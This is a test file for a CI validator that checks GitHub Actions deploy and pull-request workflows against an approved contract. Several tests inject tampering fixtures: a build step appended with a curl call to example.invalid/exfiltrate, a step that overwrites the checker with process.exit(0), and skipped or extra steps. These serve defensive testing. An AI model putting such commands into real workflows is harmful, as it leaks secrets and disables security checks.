import assert from "node:assert/strict";
import { readFileSync, writeFileSync } from "node:fs";
import { resolve } from "node:path";
import test from "node:test";

import { validateDeploymentWorkflowNodeRuntime } from "../check-deployment-workflow-node-runtime.mjs";
import {
  createTempRepo,
  disposeTempRepo,
  replaceInRepoFile,
  repoRoot,
  runCli
} from "./governance-test-helpers.mjs";

function replaceRawInTempRepo(tempRoot, relativePath, searchValue, replacementValue) {
  const filePath = resolve(tempRoot, relativePath);
  const contents = readFileSync(filePath, "utf8");
  if (!contents.includes(searchValue)) {
    throw new Error(`${relativePath} does not contain expected raw text: ${searchValue}`);
  }

  writeFileSync(filePath, contents.replace(searchValue, replacementValue), "utf8");
}

const requiredFiles = [
  ".github/workflows/deploy-pages.yml",
  ".github/workflows/publish-worker-image.yml",
  ".github/workflows/publish-problem9-devbox-image.yml",
  ".github/workflows/pull-request-ci.yml",
  ".github/workflows/pull-request-trusted-governance.yml",
  "infra/README.md",
  "package.json"
];

test("validateDeploymentWorkflowNodeRuntime accepts the checked-in workflow shape", () => {
  assert.doesNotThrow(() => validateDeploymentWorkflowNodeRuntime(repoRoot));
});

test("validateDeploymentWorkflowNodeRuntime rejects PR CI steps that only echo the runtime checker command", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/pull-request-ci.yml",
      "node infra/scripts/check-deployment-workflow-node-runtime.mjs",
      "echo node infra/scripts/check-deployment-workflow-node-runtime.mjs"
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /step "Check deployment workflow Node runtimes" must keep the approved command body/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects PR CI runtime-check steps that can be skipped", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/pull-request-ci.yml",
      "      - name: Check deployment workflow Node runtimes",
      "      - name: Check deployment workflow Node runtimes\n        if: false"
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must keep the approved step keys/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects README drift that drops the workflow-contract freeze policy", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      "infra/README.md",
      "intentionally freezes the deploy/publish workflow contract, including workflow-level metadata, job and step contract, the PR-CI pre-runtime-check step prefix, the PR-CI trigger/runtime-check contract, and the `Pull Request Trusted Governance` `pull_request_target` trusted workflow-governance gate, ",
      ""
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /infra\/README\.md/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects README drift that drops the PR-CI contract policy", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      "infra/README.md",
      "the PR-CI trigger/runtime-check contract",
      ""
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /infra\/README\.md/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects README drift that drops the trusted-governance gate policy", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      "infra/README.md",
      "`Pull Request Trusted Governance` `pull_request_target` trusted workflow-governance gate",
      "trusted gate"
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /infra\/README\.md/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects PR CI steps before the runtime check that can tamper with the checker", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/pull-request-ci.yml",
      "      - name: Install dependencies\n        run: bun install --frozen-lockfile",
      [
        "      - name: Install dependencies",
        "        run: >-",
        "          bun install --frozen-lockfile &&",
        "          printf 'process.exit(0)\\n' > infra/scripts/check-deployment-workflow-node-runtime.mjs"
      ].join("\n")
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /step \"Install dependencies\" must keep the approved command body/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects deploy workflow name drift", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/deploy-pages.yml",
      "name: Deploy Pages",
      "name: Ship Website"
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must keep workflow name "Deploy Pages"/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects PR CI workflow name drift", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/pull-request-ci.yml",
      "name: Pull Request CI",
      "name: Pull Request Gate"
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must keep workflow name "Pull Request CI"/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects trusted-governance workflow name drift", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/pull-request-trusted-governance.yml",
      "name: Pull Request Trusted Governance",
      "name: Trusted Governance"
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must keep workflow name "Pull Request Trusted Governance"/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects PR CI workflow permission drift", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/pull-request-ci.yml",
      "permissions:\n  contents: read",
      "permissions:\n  contents: write"
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /permissions\.contents must be read/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects trusted-governance workflows that are no longer pull_request_target-only", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceRawInTempRepo(
      tempRoot,
      ".github/workflows/pull-request-trusted-governance.yml",
      "  pull_request_target:\n",
      "  pull_request:\n"
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must remain a pull_request_target-only workflow/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects trusted-governance workflows that stop snapshotting the candidate PR template", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/pull-request-trusted-governance.yml",
      "          .github/PULL_REQUEST_TEMPLATE.md\n",
      ""
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /Materialize candidate governance snapshot.*approved command body/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects trusted-governance workflows that stop pinning the candidate snapshot to the event head sha", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/pull-request-trusted-governance.yml",
      '            git show "$candidate_sha:$relative_path" > "$candidate_root/$relative_path"',
      '            git show "$pr_ref:$relative_path" > "$candidate_root/$relative_path"'
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /Materialize candidate governance snapshot.*approved command body/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects PR CI workflows that omit the promotion-gate validator step", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/pull-request-ci.yml",
      "      - name: Check main-branch promotion gate policy\n        run: node infra/scripts/check-main-branch-promotion-gate.mjs\n",
      ""
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /pre-runtime-check ci step order/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects trusted-governance PR-body checks that ignore the candidate snapshot", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/pull-request-trusted-governance.yml",
      'node infra/scripts/check-pr-governance-body.mjs --repo-root "$CANDIDATE_REPO_ROOT" --event-json "$GITHUB_EVENT_PATH"',
      'node infra/scripts/check-pr-governance-body.mjs --event-json "$GITHUB_EVENT_PATH"'
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /Check PR governance body".*approved command body/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects a floating PR CI checkout action", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/pull-request-ci.yml",
      "uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8",
      "uses: actions/checkout@v4"
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must use actions\/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime still rejects runtime-check drift when the candidate checker is also tampered", () => {
  const tempRoot = createTempRepo([...requiredFiles, "infra/scripts/check-deployment-workflow-node-runtime.mjs"]);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/pull-request-ci.yml",
      "node infra/scripts/check-deployment-workflow-node-runtime.mjs",
      "echo node infra/scripts/check-deployment-workflow-node-runtime.mjs"
    );
    replaceInRepoFile(
      tempRoot,
      "infra/scripts/check-deployment-workflow-node-runtime.mjs",
      'const pullRequestCiWorkflowPath = ".github/workflows/pull-request-ci.yml";',
      'const pullRequestCiWorkflowPath = ".github/workflows/pull-request-ci.yml";\nconst candidateTamperingMarker = "runtime-check-disabled";'
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /step "Check deployment workflow Node runtimes" must keep the approved command body/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects a floating PR CI setup-bun action", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/pull-request-ci.yml",
      "uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6",
      "uses: oven-sh/setup-bun@v2"
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must use oven-sh\/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects extra PR CI jobs", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/pull-request-ci.yml",
      "      - name: Build workspace\n        run: bun run build",
      [
        "      - name: Build workspace",
        "        run: bun run build",
        "",
        "  shadow_ci:",
        "    runs-on: ubuntu-latest",
        "    steps:",
        "      - name: Shadow step",
        "        run: echo shadow"
      ].join("\n")
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must define only the "ci" job/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects PR CI runner drift", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/pull-request-ci.yml",
      "    runs-on: ubuntu-latest",
      "    runs-on: self-hosted"
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /ci job must run on ubuntu-latest/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects PR CI concurrency-group drift", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/pull-request-ci.yml",
      "      group: pull-request-ci-${{ github.event.pull_request.number }}",
      "      group: shadow-ci"
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /ci job must use concurrency group/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects PR CI cancel-in-progress drift", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/pull-request-ci.yml",
      "      cancel-in-progress: true",
      "      cancel-in-progress: false"
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /ci job must keep cancel-in-progress=true/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects PR CI workflows that are no longer pull_request-only", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceRawInTempRepo(
      tempRoot,
      ".github/workflows/pull-request-ci.yml",
      "  pull_request:",
      "  workflow_dispatch:"
    );
    replaceRawInTempRepo(
      tempRoot,
      ".github/workflows/pull-request-ci.yml",
      `    branches:
      - main
    types:
      - opened
      - reopened
      - synchronize
      - edited
      - ready_for_review
`,
      ""
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must remain a pull_request-only workflow/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects PR CI workflows that drop the edited event", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceRawInTempRepo(
      tempRoot,
      ".github/workflows/pull-request-ci.yml",
      `      - synchronize
      - edited
      - ready_for_review`,
      `      - synchronize
      - ready_for_review`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /pull_request trigger is missing event type "edited"/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects PR CI workflows that drop the ready_for_review event", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceRawInTempRepo(
      tempRoot,
      ".github/workflows/pull-request-ci.yml",
      `      - edited
      - ready_for_review`,
      "      - edited"
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /pull_request trigger is missing event type "ready_for_review"/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects a non-production deploy environment", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/deploy-pages.yml",
      "environment: production",
      "environment: staging"
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /deploy job must target environment "production"/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects extra deploy workflow jobs", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/deploy-pages.yml",
      `      - name: Deploy to Cloudflare Pages
        working-directory: apps/web
        env:
          CLOUDFLARE_API_TOKEN: \${{ secrets.CLOUDFLARE_API_TOKEN }}
          CLOUDFLARE_ACCOUNT_ID: \${{ secrets.CLOUDFLARE_ACCOUNT_ID }}
        run: >-
          bunx wrangler pages deploy dist
          --project-name=paretoproof-web
          --branch=main`,
      `      - name: Deploy to Cloudflare Pages
        working-directory: apps/web
        env:
          CLOUDFLARE_API_TOKEN: \${{ secrets.CLOUDFLARE_API_TOKEN }}
          CLOUDFLARE_ACCOUNT_ID: \${{ secrets.CLOUDFLARE_ACCOUNT_ID }}
        run: >-
          bunx wrangler pages deploy dist
          --project-name=paretoproof-web
          --branch=main

  shadow_deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Shadow deploy
        uses: cloudflare/wrangler-action@v3`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must define only the "deploy" job/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects deploy workflows that allow extra branches", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/deploy-pages.yml",
      "      - main",
      `      - main
      - release`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must protect only branch "main"/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects deploy workflows with non-string branch entries", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/deploy-pages.yml",
      "      - main",
      `      - main
      - { bad: branch }`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /push branches must contain only string entries/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects deploy workflows with scalar branch shorthand", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/deploy-pages.yml",
      "      - main",
      ""
    );
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/deploy-pages.yml",
      "    branches:",
      "    branches: main"
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /push branches must contain only string entries/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects deploy workflows with missing watched paths", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/deploy-pages.yml",
      `      - "packages/shared/**"
`,
      ""
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /push trigger is missing watched path "packages\/shared\/\*\*"/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects deploy workflows with non-string watched paths", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/deploy-pages.yml",
      `      - ".github/workflows/deploy-pages.yml"`,
      `      - ".github/workflows/deploy-pages.yml"
      - { bad: path }`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /push paths must contain only string entries/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects deploy workflows with scalar path shorthand", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/deploy-pages.yml",
      `    paths:
      - "apps/web/**"
      - "packages/shared/**"
      - "package.json"
      - "bun.lock"
      - "tsconfig.base.json"
      - ".github/workflows/deploy-pages.yml"`,
      `    paths: "apps/web/**"`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /push paths must contain only string entries/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects deploy workflows with negated watched paths", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/deploy-pages.yml",
      `      - ".github/workflows/deploy-pages.yml"`,
      `      - ".github/workflows/deploy-pages.yml"
      - "!apps/web/**"`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must not include negated path patterns/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects deploy workflows with extra push trigger filters", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/deploy-pages.yml",
      `    paths:
      - "apps/web/**"
      - "packages/shared/**"
      - "package.json"
      - "bun.lock"
      - "tsconfig.base.json"
      - ".github/workflows/deploy-pages.yml"`,
      `    paths:
      - "apps/web/**"
      - "packages/shared/**"
      - "package.json"
      - "bun.lock"
      - "tsconfig.base.json"
      - ".github/workflows/deploy-pages.yml"
    paths-ignore:
      - "docs/**"`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must keep the approved trigger filters/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects deploy workflows with workflow-dispatch inputs", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/deploy-pages.yml",
      "  workflow_dispatch:",
      `  workflow_dispatch:
    inputs:
      tag:
        required: false`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /workflow_dispatch must keep the approved trigger filters/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects scalar deploy workflow-dispatch configs", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/deploy-pages.yml",
      "  workflow_dispatch:",
      "  workflow_dispatch: true"
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /workflow_dispatch must keep the approved trigger filters/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects unexpected top-level workflow defaults", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/deploy-pages.yml",
      "env:",
      "defaults:\n  run:\n    shell: bash\n\nenv:"
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must keep the approved workflow keys/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects deploy workflows with extra watched paths", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/deploy-pages.yml",
      `      - ".github/workflows/deploy-pages.yml"`,
      `      - ".github/workflows/deploy-pages.yml"
      - "docs/**"`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must match approved watched paths exactly/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects deploy workflows with duplicate watched paths", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/deploy-pages.yml",
      `      - "apps/web/**"`,
      `      - "apps/web/**"
      - "apps/web/**"`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must match approved watched paths exactly/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects a floating deploy setup-bun action", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/deploy-pages.yml",
      "oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6",
      "oven-sh/setup-bun@v2"
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must use oven-sh\/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects a drifted deploy bun-version input", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/deploy-pages.yml",
      "bun-version: 1.3.10",
      "bun-version: 0.1.0"
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must keep with\.bun-version=1\.3\.10/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects extra unapproved deploy actions", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/deploy-pages.yml",
      "      - name: Set up Bun",
      `      - name: Shadow deploy helper
        uses: actions/github-script@v7

      - name: Set up Bun`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /not an approved pinned deploy action/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects extra top-level keys on approved deploy action steps", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/deploy-pages.yml",
      `      - name: Set up Bun`,
      `      - name: Set up Bun
        if: github.ref == 'refs/heads/main'`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must keep the approved step keys/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects extra deploy run steps", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/deploy-pages.yml",
      `      - name: Build web app
        run: bun run build:web`,
      `      - name: Build web app
        run: bun run build:web

      - name: Shadow deploy command
        run: echo exfiltrate`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /not an approved deploy run step/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects reordered deploy steps", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/deploy-pages.yml",
      `      - name: Install dependencies
        run: bun install --frozen-lockfile

      - name: Build shared package
        run: bun run build:shared`,
      `      - name: Build shared package
        run: bun run build:shared

      - name: Install dependencies
        run: bun install --frozen-lockfile`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must keep the approved step order/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects extra top-level keys on approved deploy run steps", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/deploy-pages.yml",
      `      - name: Build shared package
        run: bun run build:shared`,
      `      - name: Build shared package
        env:
          EXTRA_FLAG: true
        run: bun run build:shared`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must keep the approved step keys/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects rewritten approved deploy run steps", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/deploy-pages.yml",
      `      - name: Build shared package
        run: bun run build:shared`,
      `      - name: Build shared package
        run: bun run build:shared && curl https://example.invalid/exfiltrate`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must keep the approved command body/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects a drifted deploy runner", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/deploy-pages.yml",
      "runs-on: ubuntu-latest",
      "runs-on: windows-latest"
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /deploy job must run on ubuntu-latest/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects nested deploy environment drift", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/deploy-pages.yml",
      "environment: production",
      `environment:
      name: production
      url: https://example.invalid`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /deploy job must target environment "production"/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects nested deploy concurrency drift", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/deploy-pages.yml",
      `    concurrency:
      group: pages-production-deploy
      cancel-in-progress: true`,
      `    concurrency:
      group: pages-production-deploy
      cancel-in-progress: true
      max-parallel: 1`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /deploy concurrency must keep the approved keys/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects unexpected deploy workflow permissions", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/deploy-pages.yml",
      "  contents: read",
      `  contents: write
  id-token: write`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must keep the approved workflow permissions/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects extra deploy-step env entries", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/deploy-pages.yml",
      `        env:
          CLOUDFLARE_API_TOKEN: \${{ secrets.CLOUDFLARE_API_TOKEN }}
          CLOUDFLARE_ACCOUNT_ID: \${{ secrets.CLOUDFLARE_ACCOUNT_ID }}`,
      `        env:
          CLOUDFLARE_API_TOKEN: \${{ secrets.CLOUDFLARE_API_TOKEN }}
          CLOUDFLARE_ACCOUNT_ID: \${{ secrets.CLOUDFLARE_ACCOUNT_ID }}
          EXTRA_SECRET: \${{ secrets.EXTRA_SECRET }}`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must keep the approved env map/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

